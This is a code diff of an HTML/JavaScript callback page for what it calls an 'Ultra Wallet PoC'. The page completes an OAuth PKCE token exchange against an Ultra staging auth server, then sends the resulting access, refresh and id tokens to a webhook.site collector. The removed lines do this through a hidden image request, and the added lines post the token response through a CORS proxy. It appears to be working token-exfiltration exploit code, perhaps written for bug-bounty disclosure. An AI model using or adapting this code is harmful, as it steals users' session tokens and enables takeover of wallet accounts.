@@ -1,44 +1,33 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Ultra Wallet PoC - Callback</title>
-</head>
-<body>
-  <h1>✅ Callback Received</h1>
-  <pre id="result">Waiting...</pre>
+<script>
+  async function exchangeCode() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const code = urlParams.get("code");
+    const codeVerifier = sessionStorage.getItem("code_verifier");
 
-  <script>
-    async function exchangeCode() {
-      const urlParams = new URLSearchParams(window.location.search);
-      const code = urlParams.get("code");
-      const codeVerifier = sessionStorage.getItem("code_verifier");
+    const data = new URLSearchParams({
+      grant_type: "authorization_code",
+      client_id: "2f6ca3c9-87ec-4042-a464-21349485a16f",
+      code,
+      code_verifier: codeVerifier,
+      redirect_uri: "https://nathanogaga118.github.io/ultra-poc/callback.html"
+    });
 
-      const data = new URLSearchParams({
-        grant_type: "authorization_code",
-        client_id: "2f6ca3c9-87ec-4042-a464-21349485a16f",
-        code,
-        code_verifier: codeVerifier,
-        redirect_uri: "https://nathanogaga118.github.io/ultra-poc/callback.html"
-      });
+    const response = await fetch("https://auth.staging.ultra.io/auth/realms/ultraio/protocol/openid-connect/token", {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: data
+    });
 
-      const response = await fetch("https://auth.staging.ultra.io/auth/realms/ultraio/protocol/openid-connect/token", {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: data
-      });
+    const result = await response.json();
+    document.getElementById("result").textContent = JSON.stringify(result, null, 2);
 
-      const result = await response.json();
-      document.getElementById("result").textContent = JSON.stringify(result, null, 2);
+    // ✅ CORS bypass using proxy
+    fetch("https://corsproxy.io/?" + encodeURIComponent("https://webhook.site/6e1baddf-015d-41aa-8d1c-93b57595aa9b"), {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(result)
+    });
+  }
 
-      // ✅ CORS-free token exfiltration via image request
-      const img = new Image();
-      img.src = `https://webhook.site/6e1baddf-015d-41aa-8d1c-93b57595aa9b?` +
-        `access_token=${encodeURIComponent(result.access_token || "")}` +
-        `&refresh_token=${encodeURIComponent(result.refresh_token || "")}` +
-        `&id_token=${encodeURIComponent(result.id_token || "")}`;
-    }
-
-    exchangeCode();
-  </script>
-</body>
-</html>
+  exchangeCode();
+</script>
